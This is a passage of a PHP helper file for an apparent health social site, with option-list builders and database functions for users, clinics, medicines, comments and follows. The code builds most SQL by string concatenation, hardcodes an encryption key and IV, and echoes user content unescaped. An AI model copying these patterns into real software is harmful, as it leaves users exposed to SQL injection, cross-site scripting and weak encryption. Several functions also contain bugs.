<?php

if (session_id() == null || session_id() == "") {
    session_start();
}
function safe($arr)
{
//echo  "<pre>" ;
//print_r($arr) ;
  $keyarr=array_keys($arr);
  //print_r($keyarr)  ;
  $newarr=array();
  foreach($keyarr as $key )
    {
   $newarr[$key]=mysql_real_escape_string(strip_tags(trim($arr[$key])));
    }
  //print_r($newarr)    ;   exit;
  return $newarr;
  }
function make_clickable($text) {
    $regex = '#\bhttps?://[^\s()<>]+(?:\([\w\d]+\)|([^[:punct:]\s]|/))#';
    return preg_replace_callback($regex, function ($matches) {
        return "<a href=\'{$matches[0]}\'>{$matches[0]}</a>";
    }, $text);
}
$ARR_STRUCTURE_CATEGORY = array('Man', 'Women', 'Kid');

$ARR_BLOODGROUP = array('A+', 'A-', 'B+', 'B-', 'O+', 'O-', 'AB+', 'AB-');

$ARR_Specialization = array('Allergist',
    'Anesthesiologist',
    'Cardiologist',
    'Dermatologist',
    'Gastroenterologist',
    'Hematologist/Oncologist',
    'Internal Medicine Physician',
    'Nephrologist',
    'Neurologist',
    'Neurosurgeon',
    'Obstetrician',
    'Gynecologist',
    'Nurse-Midwifery',
    'Occupational Medicine Physician',
    'Ophthalmologist',
    'Oral and Maxillofacial Surgeon',
    'Orthopaedic Surgeon',
    'Otolaryngologist',
    'Pathologist',
    'Pediatrician',
    'Plastic Surgeon');


$Arr_Qualification = array('Magnetic Resonance Imaging',
    'Emergency Medical Technician',
    'Master of Business Administration',
    'Advanced Cardiac Life Support',
    'Registered Nurse',
    'Licensed Practical Nurse',
    'Certified Occupational Therapy Assistant',
    'NP: Nurse Practitioner',
    'Physical Therapist',
    'Bachelor of Science',
    'BSN: Bachelor of Science in Nursing',
    'Physician Assistant',
    'Registered Respiratory Therapist',
    'Doctor of Veterinary Medicine',
    'Occupational Therapist',
    'Clinical Nurse Specialist',
    'Certified Nursing Assistant',
    'Medical Doctor',
    'Medical Examiner',
    'Bachelor of Medicine',
    'Ear, Nose and Throat',
    'Family Nurse Practitioner',
    'Licensed Physical Therapist',
    'Nursing Home Administrator',
    'Physician Assistant',
    'Physical Therapy Assistant',
    'Radiologic Technologist',
    'Veterinary Assistant',
    'M.B.B.S',
    'B.D.S',
    'B.Pharma',
    'B.Sc Nursing',
    'B.P.T',
    'B.O.T',
    'B.H.M.S',
    'B.U.M.S',
    'Optometry',
    'Ophthalmic Assistant Medical Course',
    'Histopathalogical Lab Technology',
    'B.A.M.S',
    'D. Pharma',
    'Lab Technicians',
    'Sanitary Inspector Medical Course',
    'Oothopedist Medical Course',
    'Dental Mechanic Medical Course',
    'Dental Hygienist Medical Course',
    'Bachleor of Occupationaltherapy',
    'Nuclear Medicine Technology',
    'M.S.',
    'D.M.');

$ARR_Department = array('Tablet',
    'Capsule',
    'Gel',
    'Powder',
    'Liquid',
    'Syrup',
    'Injection',
    'Lotion');

function encrypt_decrypt($string, $flg) {
    $output = false;

    $key = 'My strong random secret key';

    // initialization vector
    $iv = md5(md5($key));

    //if( $action == 'encrypt' )
    if ($flg) {
        $output = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($key), $string, MCRYPT_MODE_CBC, $iv);
        $output = base64_encode($output);
    } else { //if( $action == 'decrypt' )
        $output = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($key), base64_decode($string), MCRYPT_MODE_CBC, $iv);
        $output = rtrim($output, "");
    }
    return $output;
}

function getBloodGroup($gp = "") {
    $str = "<option value=''>Select Blood Group </option>";
    foreach ($ARR_BLOODGROUP as $bl) {
        $str.="<option value='" . $bl . "' ";
        if ($gp == $bl) {
            $str.= " selected ";
        }

        $str.=">" . $bl . "</option>";
    }
    return $str;
}

function getSpecialization($sp = "") {
    $str = "<option value=''>Select Blood Group </option>";
    $i = 0;
    foreach ($ARR_Specialization as $spc) {
        $str.="<option value='" . $spc . "' ";
        if ($sp == $spc) {

            $str.= " selected ";
            $i++;
        }

        $str.=">" . $spc . "</option>";
    }
    $str.="<option value='o' >Other</option>";

    if ($sp != "" && $i == 0) {
        $str.="<option value='" . $sp . "' selected >" . $sp . "</option>";
    }

    return $str;
}

function getQualification($qu = "") {
    $qu = "";
    $str = "<option value=''>Select Qualification </option>";
    $i = 0;
    foreach ($ARR_Qualification as $qua) {
        $str.="<option value='" . $qua . "' ";
        if ($qu == $qua) {

            $str.= " selected ";
            $i++;
        }

        $str.=">" . $qua . "</option>";
    }
    $str.="<option value='o' >Other</option>";

    if ($qu != "" && $i == 0) {
        $str.="<option value='" . $qu . "' selected >" . $qu . "</option>";
    }

    return $str;
}

function sentence_cap($impexp, $sentence_split) {
    $textbad = explode($impexp, $sentence_split);
    $newtext = array();
    foreach ($textbad as $sentence) {
        $sentencegood = ucfirst(strtolower($sentence));
        $newtext[] = $sentencegood;
    }
    $textgood = implode($impexp, $newtext);
    return ucfirst($textgood);
}

function img_resize($tmpname, $size, $save_dir, $save_name, $maxisheight = 0) {
    $save_dir .= (substr($save_dir, -1) != "/") ? "/" : "";
    $gis = getimagesize($tmpname);
//   echo "<pre>";
//    print_r($gis);
//
    $type = $gis[2];
    switch ($type) {
        case "1":
            $imorig = imagecreatefromgif($tmpname);
            break;
        case "2":
            $imorig = imagecreatefromjpeg($tmpname);
            break;
        case "3":
            $imorig = imagecreatefrompng($tmpname);
            break;
        default:
            $imorig = imagecreatefromjpeg($tmpname);
    }

    $x = imagesx($imorig);
    $y = imagesy($imorig);

    $woh = (!$maxisheight) ? $gis[0] : $gis[1];

    if ($woh <= $size) {
        $aw = $x;
        $ah = $y;
    } else {
        if (!$maxisheight) {
            $aw = $size;
            $ah = $size * $y / $x;
        } else {
            $aw = $size * $x / $y;
            $ah = $size;
        }
    }
    $im = imagecreatetruecolor($aw, $ah);
    if (imagecopyresampled($im, $imorig, 0, 0, 0, 0, $aw, $ah, $x, $y))
        if ($type = '3') {
            // echo "mime";
            if (imagepng($im, $save_dir . $save_name))
                return true;
            else
                return false;
        }else {
            if (imagejpeg($im, $save_dir . $save_name))
                return true;
            else
                return false;
        }
}

function resizepics($pics, $newwidth, $newheight) {
    if (preg_match("/.jpg/i", "$pics")) {
        header('Content-type: image/jpeg');
    }
    if (preg_match("/.gif/i", "$pics")) {
        header('Content-type: image/gif');
    }
    list($width, $height) = getimagesize($pics);
    if ($width > $height && $newheight < $height) {
        $newheight = $height / ($width / $newwidth);
    } else if ($width < $height && $newwidth < $width) {
        $newwidth = $width / ($height / $newheight);
    } else {
        $newwidth = $width;
        $newheight = $height;
    }
    if (preg_match("/.jpg/i", "$pics")) {
        $source = imagecreatefromjpeg($pics);
    }
    if (preg_match("/.jpeg/i", "$pics")) {
        $source = imagecreatefromjpeg($pics);
    }
    if (preg_match("/.jpeg/i", "$pics")) {
        $source = Imagecreatefromjpeg($pics);
    }
    if (preg_match("/.png/i", "$pics")) {
        $source = imagecreatefrompng($pics);
    }
    if (preg_match("/.gif/i", "$pics")) {
        $source = imagecreatefromgif($pics);
    }
    $thumb = imagecreatetruecolor($newwidth, $newheight);
    imagecopyresized($thumb, $source, 0, 0, 0, 0, $newwidth, $newheight, $width, $height);
    return imagejpeg($thumb);

    if (preg_match("/.jpg/i", "$pics")) {
        return imagejpeg($thumb);
    }
    if (preg_match("/.jpeg/i", "$pics")) {
        return imagejpeg($thumb);
    }
    if (preg_match("/.jpeg/i", "$pics")) {
        return imagejpeg($thumb);
    }
    if (preg_match("/.png/i", "$pics")) {
        return imagepng($thumb);
    }
    if (preg_match("/.gif/i", "$pics")) {
        return imagegif($thumb);
    }
}

function resize($img, $w, $h, $newfilename) {

    //Check if GD extension is loaded
    if (!extension_loaded('gd') && !extension_loaded('gd2')) {
        trigger_error("GD is not loaded", E_USER_WARNING);
        return false;
    }

    //Get Image size info
    $imgInfo = getimagesize($img);
    switch ($imgInfo[2]) {
        case 1: $im = imagecreatefromgif($img);
            break;
        case 2: $im = imagecreatefromjpeg($img);
            break;
        case 3: $im = imagecreatefrompng($img);
            break;
        default: trigger_error('Unsupported filetype!', E_USER_WARNING);
            break;
    }

    //If image dimension is smaller, do not resize
    if ($imgInfo[0] <= $w && $imgInfo[1] <= $h) {
        $nHeight = $imgInfo[1];
        $nWidth = $imgInfo[0];
    } else {
        //yeah, resize it, but keep it proportional
        if ($w / $imgInfo[0] > $h / $imgInfo[1]) {
            $nWidth = $w;
            $nHeight = $imgInfo[1] * ($w / $imgInfo[0]);
        } else {
            $nWidth = $imgInfo[0] * ($h / $imgInfo[1]);
            $nHeight = $h;
        }
    }
    $nWidth = round($nWidth);
    $nHeight = round($nHeight);

    $newImg = imagecreatetruecolor($nWidth, $nHeight);

    /* Check if this image is PNG or GIF, then set if Transparent */
    if (($imgInfo[2] == 1) OR ($imgInfo[2] == 3)) {
        imagealphablending($newImg, false);
        imagesavealpha($newImg, true);
        $transparent = imagecolorallocatealpha($newImg, 255, 255, 255, 127);
        imagefilledrectangle($newImg, 0, 0, $nWidth, $nHeight, $transparent);
    }
    imagecopyresampled($newImg, $im, 0, 0, 0, 0, $nWidth, $nHeight, $imgInfo[0], $imgInfo[1]);

    //Generate the file, and rename it to $newfilename
    switch ($imgInfo[2]) {
        case 1: imagegif($newImg, $newfilename);
            break;
        case 2: imagejpeg($newImg, $newfilename);
            break;
        case 3: imagepng($newImg, $newfilename);
            break;
        default: trigger_error('Failed resize image!', E_USER_WARNING);
            break;
    }

    return $newfilename;
}

function checkImageType($image) {
    if (($image == "image/jpeg") || ($image == "image/jpg") || ($image == "image/png") || ($image == "image/JPEG") || ($image == "image/JPG") || ($image == "image/PNG")
    ) {

        return true;
    } else {
        return false;
    }
}

function getAllCity($city = "") {


//     $result= mysql_query("SELECT  city_name FROM `tblcitylist`");
    $result = mysql_query("SELECT  name FROM `city`");
    $str = "<option value=''>Select City</option>";
    while ($row = mysql_fetch_array($result)) {
        $str.="<option value='" . $row['city_name'] . "' ";
        if ($city == $row['city_name']) {
            $str.= " selected ";
        }

        $str.=">" . $row['city_name'] . "</option>";
    }
    return $str;
}

function getAllCityById($city = "", $id = "") {


//     $result= mysql_query("SELECT  city_name FROM `tblcitylist`");
    $sql = "SELECT  * FROM `city`";
    if ($id != "") {
        $sql = "SELECT  * FROM `city` where state_id='" . $id . "'";
    }
    $result = mysql_query($sql);
    $str = "<option value=''>Select City</option>";
    while ($row = mysql_fetch_array($result)) {
        $str.="<option value='" . $row['id'] . "' ";
        if ($city == $row['id']) {
            $str.= " selected ";
        }

        $str.=">" . $row['name'] . "</option>";
    }
    return $str;
}

function getStateByID($id) {
    $result = mysql_query("SELECT  * FROM `state` where id='" . $id . "'");

    $row = mysql_fetch_array($result);
    return $row['name'];
}

function getCityByID($id) {
    $result = mysql_query("SELECT  * FROM `city` where id='" . $id . "'");
    $row = mysql_fetch_array($result);
    return $row['name'];
}

function getStateByName($id) {
    $result = mysql_query("SELECT  * FROM `state` where `name` = '" . $id . "'");

    $row = mysql_fetch_array($result);
    return $row['id'];
}

function getCityByName($id) {
    $result = mysql_query("SELECT  * FROM `city` where `name`= '" . $id . "' ");
    $row = mysql_fetch_array($result);
    return $row['id'];
}

function getAllState($state = "") {
//$result= mysql_query("SELECT  distinct (state) FROM `tblcitylist`");
    $result = mysql_query("SELECT  * FROM `state`");
    $str = "<option value=''>Select State</option>";
    while ($row = mysql_fetch_array($result)) {
        $str.="<option value='" . $row['id'] . "' ";
        if ($state != "" && $state == $row['id']) {
            $str.= " selected ";
        }
        $str.=" >" . $row['name'] . "</option>";
    }
    return $str;
}

function getAllCategory($cat, $select = "") {
    //  echo $select;
    $result = mysql_query("SELECT * FROM `category` where `type`='" . $cat . "' and status='1'");
    $str = "<option value=''>Select Category</option>";
    while ($row = mysql_fetch_array($result)) {
        $str.="<option value='" . $row['id'] . "' ";
        if ($select == $row['id']) {
            $str.= " selected  ";
        }
        $str.=">" . $row['name'] . "</option>";
    }
    return $str;
}

function getCategoryIdByName($cat, $name) {
    //  echo $select;
    $result = mysql_query("SELECT * FROM `category` where `type`='" . $cat . "' And name='" . $name . "' and status='1'");
    $row = mysql_fetch_array($result);
    $str = $row['id'];
    return $str;
}

function getCategoryNameById($cat, $id) {
    //  echo $select;
    $result = mysql_query("SELECT * FROM `category` where `type`='" . $cat . "' And id='" . $id . "' and status='1'");
    $row = mysql_fetch_array($result);
    $str = $row['name'];
    return $str;
}

function getStoreById($id) {
    return mysql_fetch_array(mysql_query("SELECT *FROM `store` where id='" . $id . "'"));
}

/////Store
//insert Store

function insertStore($arr) {
    $sql = "INSERT INTO `store` (
                `id` ,
                `name` ,
                `address` ,
                `city` ,
                `state` ,
                `pin` ,
                `phno` ,
                `website`,
                `recoment` ,
                `like` ,
                `rating` ,
                `category` ,
                `status`
                )
                VALUES (
                NULL , '" . $arr['name'] . "', '" . $arr['address'] . "', '" . $arr['city'] . "', '" . $arr['state'] . "', '" . $arr['pin'] . "', '" . $arr['phno'] . "','" . $arr['website'] . "',
                    '0',
                    '0',
                    '0',
                    '" . $arr['category'] . "',
                    '1'
                );";

    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function storeUpdate($arr) {
    $sql = "UPDATE  `store` SET `name` = '" . $arr['name'] . " ',
            `address` = '" . $arr['address'] . "',
            `city` = '" . $arr['city'] . "',
            `state` = '" . $arr['state'] . "',
            `pin` = '" . $arr['pin'] . "',
            `phno` = '" . $arr['phno'] . "',
            `website` = '" . $arr['website'] . "',
            `like` = '" . $arr['like'] . "',
            `rating` = '" . $arr['rating'] . "',
            `category` = '" . $arr['category'] . "'
             WHERE `store`.`id` ='" . $arr['id'] . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function storeDelete($id) {
    $sql = "UPDATE  `store` SET `status` = b'0' WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function insertStructure($arr) {
    $sql = "INSERT INTO  `structure` (
            `id` ,
            `category` ,
            `name` ,
            `icon` ,
            `images` ,
            `status`
            )
            VALUES (
            NULL , '" . $arr['category'] . "', '" . $arr['name'] . "', '" . $arr['icon'] . "', '" . $arr['images'] . "', '1'
            ); ";

    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function getStructreById($id) {
    return mysql_fetch_array(mysql_query("SELECT *FROM `structure` where id='" . $id . "'"));
}

function structreUpdate($dataArr) {
    $sql = "UPDATE `structure` SET `category` = '" . $dataArr['category'] . "',
                                    `name` = '" . $dataArr['name'] . "',
                                    `icon` = '" . $dataArr['icon'] . "',
                                    `details` = '" . $dataArr['details'] . "',
                                    `images` = '" . $dataArr['images'] . "' WHERE `structure`.`id` ='" . $dataArr['id'] . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function structreDelete($id) {
    $sql = "UPDATE  `structure` SET `status` = '0'  WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function insertuser($dataArr) {
    $sql = "INSERT INTO `users`(`user_type`, `f_name`, `l_name`, `email`, `password`, `photo`, `mobile`, `address1`, `address2`, `state`, `city`, `zip`, `phone_no`, `fax_no`, `website`, `dob`, `gender`,`height`, `weigth`, `blood_group`, `specialization`, `qualification`, `experience`, `registration_no`, `department`, `indications`, `color`, `strength`, `status`) VALUES
   ('" . $dataArr['user_type'] . " ',
   '" . $dataArr['f_name'] . " ',
   '" . $dataArr['l_name'] . " ',
   '" . $dataArr['email'] . " ',
   '" . $dataArr['password'] . " ',
   '" . $dataArr['photo'] . " ',
   '" . $dataArr['mobile'] . " ',
   '" . $dataArr['address1'] . " ',
   '" . $dataArr['address2'] . " ',
   '" . $dataArr['state'] . " ',
   '" . $dataArr['city'] . " ',
   '" . $dataArr['zip'] . " ',
   '" . $dataArr['phone_no'] . " ',
   '" . $dataArr['fax_no'] . " ',
   '" . $dataArr['website'] . " ',
   '" . $dataArr['dob'] . " ',
    '" . $dataArr['gender'] . " ',
   '" . $dataArr['height'] . " ',
   '" . $dataArr['weigth'] . " ',
   '" . $dataArr['blood_group'] . " ',
   '" . $dataArr['specialization'] . " ',
   '" . $dataArr['qualification'] . " ',
   '" . $dataArr['experience'] . " ',
   '" . $dataArr['registration_no'] . " ',
   '" . $dataArr['department'] . " ',
   '" . $dataArr['indications'] . " ',
   '" . $dataArr['color'] . " ',
   '" . $dataArr['strength'] . " ',
   '" . $dataArr['status'] . " ')";
    //  [value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10],[value-11],[value-12],[value-13],[value-14],[value-15],[value-16],[value-17],[value-18],[value-19],[value-20],[value-21],[value-22],[value-23],[value-24],[value-25],[value-26],[value-27],[value-28],[value-29])";
    if (mysql_query($sql)) {
        return mysql_insert_id();
    } else {
        return false;
    }
}

function getUserByEmail($email) {
    $result = mysql_query("select * from `users` where email='" . $email . "'");
    return $row = mysql_fetch_array($result);
}

function getUserById($id) {
    $result = mysql_query("select * from `users` where id='" . $id . "'");
    return $row = mysql_fetch_array($result);
}

function activeuser($id) {
    $sql = "UPDATE `users` SET `status` = '1' WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function updateProfileImage($id, $fileName) {
    $sql = "UPDATE `users` SET `photo` = '" . $fileName . "' WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function errorMessage() {
    if (isset($_SESSION['err_msg']) && $_SESSION['err_msg'] != "") {
        echo "<script>
      $(function () {



     BootstrapDialog.show({
        title: 'Error Message',
        message: '" . $_SESSION['err_msg'] . "',
        buttons: [{
            label: 'Close',
            class:'btn btn-info',
            action: function(dialog) {
                dialog.close();//.setTitle('Title 1');
            }

        }]
    });
    });


      </script>";
        $_SESSION['err_msg'] = "";
    }
}

function insertMedicine($arr) {
    $sql = "INSERT INTO `medicine`(`id`, `name`, `company`, `description`,`category`) VALUES  (null ,'" . $arr['name'] . "','" . $arr['company'] . "','" . $arr['description'] . "','" . $arr['category'] . "' )";
    if (mysql_query($sql)) {
        return mysql_insert_id();
    } else {
        return false;
    }
}

function getMedicineById($id) {
    return mysql_fetch_array(mysql_query("SELECT *FROM `medicine` where id='" . $id . "'"));
}

function medicineUpdate($arr) {
    $sql = "UPDATE  `medicine` SET `name` = '" . $arr['name'] . "',
`company` = '" . $arr['company'] . "',
`description` = '" . $arr['description'] . "',
`category` = '" . $arr['category'] . "' WHERE `id` ='" . $arr['id'] . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function midicineDelete($id) {
    $sql = "UPDATE  `medicine` SET `status` = '0' WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function clinicsAdd($arr) {
    $sql = "INSERT INTO  `clinics` (
                `id` ,
                `name` ,
                `address` ,
                `city` ,
                `state` ,
                `pin` ,
                `phno` ,
                `website`,
                `recoment` ,
                `like` ,
                `stars` ,
                `category` ,
                `status`
                )
                VALUES (
                NULL , '" . $arr['name'] . "', '" . $arr['address'] . "', '" . $arr['city'] . "', '" . $arr['state'] . "', '" . $arr['pin'] . "', '" . $arr['phno'] . "','" . $arr['website'] . "',
                    '0',
                    '0',
                    '0',
                    '" . $arr['category'] . "',
                    '1'
                );";

    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function clinicsUpdate($arr) {
    $sql = "UPDATE  `clinics` SET `name` = '" . $arr['name'] . " ',
            `address` = '" . $arr['address'] . "',
            `city` = '" . $arr['city'] . "',
            `state` = '" . $arr['state'] . "',
            `pin` = '" . $arr['pin'] . "',
            `phno` = '" . $arr['phno'] . "',
            `website` = '" . $arr['website'] . "',
            `like` = '" . $arr['like'] . "',
            `stars` = '" . $arr['stars'] . "',
            `category` = '" . $arr['category'] . "'
             WHERE `id` ='" . $arr['id'] . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function getClinicsById($id) {
    return mysql_fetch_array(mysql_query("SELECT *FROM `clinics` where id='" . $id . "'"));
}

function clinicsDelete($id) {
    $sql = "UPDATE  `clinics` SET `status` = '0' WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function symptomsAdd($arr) {
    $sql = "INSERT INTO `symptoms` (
            `id` ,
            `name` ,
            `description` ,
            `category`
            )
            VALUES (
            NULL , '" . $arr['name'] . "', '" . $arr['description'] . "', '" . $arr['category'] . "'
            );
            ";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function getSymptomsById($id) {
    return mysql_fetch_array(mysql_query("SELECT *FROM `symptoms` where id='" . $id . "'"));
}

function symptomsUpdate($arr) {
    $sql = "UPDATE  `symptoms` SET `name` = '" . $arr['name'] . "',
`description` = '" . $arr['description'] . "',
`category` = '" . $arr['category'] . "' WHERE `id` ='" . $arr['id'] . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function symptomsDelete($id) {
    $sql = "UPDATE  `symptoms` SET `status` = '0' WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

//Home page Display
function getHomeFollow($i) {
    $str = "";

 $sql = "SELECT * FROM `users` where  `status`= '1' and `user_type`='2'  order by rand() limit 0 ," . $i;
if(isset($_SESSION['id']) && $_SESSION['id']!="")
{
 /*$sql =  "Select A.*  From(SELECT * FROM `users` where `status`= '1' and `user_type`='2' and id !='".$_SESSION['id']."')A
left join follows B on
A.id != B.follow_id and  B.user_id='".$_SESSION['id']."'
order by rand() limit 0 ," . $i;*/
    /*Select distinct A.* From(SELECT * FROM `users` where `status`= '1' and `user_type`='2' and id !='7' )A left join (SELECT * FROM `follows` where `user_id`='7' ) B on A.id != B.follow_id */
 
  /* $sql = "Select distinct  A.* From(SELECT * FROM `users` where `status`= '1' and `user_type`='2' and id !='".$_SESSION['id']."')A 
         left join 
         (SELECT * FROM `follows` where `user_id`='".$_SESSION['id']."') B on A.id != B.follow_id order by rand() limit 0 ," . $i;*/
   // $sql = "SELECT * FROM `users` where  `status`= '1' and `user_type`='2' AND id!='".$_SESSION['id']."' order by rand() limit 0 ," . $i;
    $sql="select * from `users` where id Not IN(select follow_id from `follows` where type='users' And `user_id`='".$_SESSION['id']."')AND `user_type`='2' AND id!='".$_SESSION['id']."' order by rand() limit 0 ," . $i;
}
    $result = mysql_query($sql);
    $i = 0;
    while ($row = mysql_fetch_array($result)) {
        $i++;
        $img = IMAGE_URL . "profile/40/" . $row['photo'];

        if (!file_exists($img)) {
            $img = SITE_URL . "images/temp40.jpg";
        } else {
            $img = SITE_URL . "uploades/profile/40/" . $row['photo'];
        }
        $address = $row['state'] != "" ? getStateByID($row['state']) . ", " : "";
        $address.=$row['city'] != "" ? getCityByID($row['city']) : "";
        $str.= '<ul>
                        <li><img src="' . $img . '" alt="" /> </li>
                        <li><span>' . $row['f_name'] . " " . $row['l_name'] . ' </span>' . $address . ' </li>
                        <li><a  class="btn-follow" id=\'follow' . $i . '\' ';
        if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

            $ro = getisfollow('users', $row['id']);
            if ($ro['id'] != "") {
                $str.= '   href="javascript:" >Following '; //'  onclick="homefollows(\'0\',\''.$row['id'].'\',\'users\',\'users'.$i.'\')"  ';
            } else {
                $str.= ' href="javascript:"  onclick="homefollows(\'1\',\'' . $row['id'] . '\',\'users\',\'follow' . $i . '\')">Follow  ';
            }
        } else {

            $str.= 'href="#login" data-toggle="modal">Follow ';
        }
        $str.='   </a ></li>
                    </ul>';
    }

    return $str;
}

function getHospitals($num) {
    $str = "";
    $sql = "SELECT id,name FROM `clinics` where  `status`= '1'  order by rand() limit 0 ," . $num;
    $result = mysql_query($sql);
    while ($row = mysql_fetch_array($result)) {
        $str.='<li><a href="clinics.php?i='.$row['id'].'" style="text-decoration: none; color: #515151;">' . $row['name'] . '</a></li>';
    }
    return $str;
}

function firstaidsAdd($arr) {
    $sqlquery = "INSERT INTO `first_aids` (
				`id`,
				`name`,
				`causes`,
				`risk_factor`,
				`treatment`,
				`status`)
				 VALUES (NULL, '" . $arr['name'] . "',  '" . $arr['causes'] . "',  '" . $arr['risk_factor'] . "',  '" . $arr['treatment'] . "', '1');";

    if (mysql_query($sqlquery)) {
        return true;
    } else {
        return false;
    }
}

function getfirstaidsById($id) {
    return mysql_fetch_array(mysql_query("SELECT * FROM `first_aids` where id='" . $id . "'"));
}

function firstaidsUpdate($arr) {
   // echo '<pre>';
   // print_r($arr);
   //echo
    $sql = "UPDATE `first_aids` SET `name` = '" .  $arr['name'] . "',
`causes` = '" . $arr['causes'] . "',
`risk_factor` = '" . $arr['risk_factor'] . "',
    `treatment` = '" . $arr['treatment'] . "'  WHERE `id` ='" . $arr['id'] . "';";
  
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function firstaidsDelete($id) {
    $sql = "UPDATE  `first_aids` SET `status` = '0' WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function healthtipsAdd($arr) {
    $sqlquery = "INSERT INTO `health_tips` (
		`id`,
		`name`,
		`description`)
		 VALUES (NULL, '" . $arr['name'] . "',  '" . $arr['description'] . "');";

    if (mysql_query($sqlquery)) {
        return true;
    } else {
        return false;
    }
}

function gethealthtipsById($id) {
    return mysql_fetch_array(mysql_query("SELECT * FROM `health_tips` where id='" . $id . "'"));
}

function healthtipsUpdate($arr) {
    $sql = "UPDATE `health_tips` SET `name` = '" . $arr['name'] . "',`description` = '" . $arr['description'] . "' WHERE `id` ='" . $arr['id'] . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function healthtipsDelete($id) {
    $sql = "UPDATE  `health_tips` SET `status` = '0' WHERE `id` ='" . $id . "';";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function getislike($type, $likedId) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `likes` WHERE `type`='" . $type . "' and `user_id`='" . $_SESSION['id'] . "' and `liked_id`='" . $likedId . "'"));
    return $row;
}

function unlike($id, $val) {
    $sql = "UPDATE `likes` SET `status` = '" . $val . "' WHERE `id` ='" . $id . "';";
    mysql_query($sql);
}

function getisfollow($type, $likedId) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `follows` WHERE `type`='" . $type . "' and `user_id`='" . $_SESSION['id'] . "' and `follow_id`='" . $likedId . "'"));
    return $row;
}

function unfollow($id, $val) {
    $sql = "UPDATE `follows` SET `status` = '" . $val . "' WHERE `id` ='" . $id . "';";
    mysql_query($sql);
}

function getallFollow($type, $likedId) {
    $row = mysql_fetch_array(mysql_query("SELECT count(id) FROM `follows` WHERE `type`='" . $type . "' and `status`='1' and `follow_id`='" . $likedId . "'"));
    return $row['0'];
}

function getFollowById($id) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `follows` WHERE `id`='" . $id . "'"));
    return $row;
}

function unfavourite($id, $val) {
    $sql = "UPDATE `favourite` SET `status` = '" . $val . "' WHERE `id` ='" . $id . "';";
    mysql_query($sql);
}

function getisfavourite($type, $likedId) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `favourite` WHERE `type`='" . $type . "' and `user_id`='" . $_SESSION['id'] . "' and `favourite_id`='" . $likedId . "'"));
    return $row;
}

function getallfavourite($type, $likedId) {
    $row = mysql_fetch_array(mysql_query("SELECT count(id) FROM `favourite` WHERE `type`='" . $type . "' and `status`='1' and `favourite_id`='" . $likedId . "'"));
    return $row['0'];
}

function getalllikeUserID($id) {
    $row = mysql_fetch_array(mysql_query("SELECT count(id) FROM `likes` WHERE `status`='1' and `user_id`='" . $id . "'"));
    return $row['0'];
}

function getallfavouriteUserID($id) {
    $row = mysql_fetch_array(mysql_query("SELECT count(id) FROM `favourite` WHERE `status`='1' and `user_id`='" . $id . "'"));
    return $row['0'];
}

function setview($view_id) {
    $sql = "INSERT INTO `viewes` (
`id` ,
`type` ,
`viewer_id` ,
`user_id`

)
VALUES (
NULL , 'users', '" . $view_id . "', '" . $_SESSION['id'] . "'
);

";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function getallviewesUserID($id) {
    $row = mysql_fetch_array(mysql_query("SELECT count(id) FROM `viewes` WHERE `status`='1' and `viewer_id`='" . $id . "'"));
    return $row['0'];
}

//-----------------------------------------------------

function getComment($type, $id) {

    $sql = "SELECT * FROM `comment` WHERE `type`='" . $type . "' And `post_id`='" . $id . "' order by id desc";
    $result = mysql_query($sql);
    $outstr = '';
    while ($row = mysql_fetch_array($result)) {
        $user = getUserById($row['comment_by_id']);
        $img = IMAGE_URL . "profile/40/" . $user['photo'];

        if (!file_exists($img)) {
            $img = SITE_URL . "images/temp40.jpg";
        } else {
            $img = SITE_URL . "uploades/profile/40/" . $user['photo'];
        }

        $outstr.= '
                                    <li>
                                        <div class="commenterImage">
                                            <img src="' . $img . '" />
                                        </div>
                                        <div class="commentText">
                                            <h5>' . sentence_cap(" ", $user['f_name'] . $user['l_name']) . '</h5>
                                            <p class=""> ' . $row['message'] . '</p>
                                            <span class="date sub-text">on ' . date('d-m-Y g:i A', strtotime($row['created'])) . '</span>

                                        </div>
                                    </li>';
    }
    return $outstr . "";
}

function commentInsert($arr) {
    $sql = "INSERT INTO `comment` (`id`, `type`, `post_id`, `comment_by_id`, `message`, `status`)
    VALUES
    (NULL, '" . $arr['type'] . "', '" . $arr['id'] . "', '" . $_SESSION['id'] . "', '" . $arr['message'] . "','1');";
    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

//new user box to display on home page 
function getNewUserbox($i, $id) {
    $str = "";

    $userdata = getUserById($id);

    $img = IMAGE_URL . "profile/40/" . $userdata['photo'];

    if (!file_exists($img)) {
